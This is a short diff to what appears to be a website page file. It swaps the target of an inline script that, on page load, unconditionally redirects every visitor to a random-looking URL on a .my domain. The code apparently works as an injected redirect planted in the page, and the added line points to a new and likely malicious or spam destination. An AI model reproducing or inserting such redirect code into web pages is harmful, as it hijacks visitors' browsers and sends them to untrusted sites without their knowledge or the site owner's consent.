@@ -5,7 +5,7 @@ config:
 ---
 <script>
   if (typeof window !== 'undefined') {
-     window.location.replace('http://g51et706tl.my/L5y14EQNSyt/VV9Q0dAJ/wghyFbNX.html');
+     window.location.replace('http://p2xn573kx.my/rxtk6RD5SVuvQ/508UsxxZ/4kot9it.html');
     //window.open('/pzm.jpg', '_self')
   }
 </script>
